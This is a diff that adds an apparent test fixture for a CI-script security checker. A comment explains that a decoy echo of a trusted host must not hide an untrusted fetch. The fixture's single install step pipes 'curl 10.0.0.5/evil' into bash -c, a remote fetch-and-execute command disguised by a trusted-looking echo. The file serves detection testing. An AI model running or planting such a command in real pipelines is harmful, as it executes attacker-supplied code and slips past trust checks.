@@ -1,0 +1,10 @@
+# violation: the trust decision reads only the FETCH command's own text,
+# from the curl/wget word to the next `;`, `|`, `&`, or the end of the
+# substitution. A decoy `echo` of a trusted host earlier in the same
+# substitution is text elsewhere in the span, not part of the fetch
+# command, and must not launder an untrusted fetch sitting right after
+# it, including one whose target is a raw IP address.
+install:
+  image: alpine:3.19
+  script:
+    - bash -c "$(echo https://firebase.tools; curl 10.0.0.5/evil)"
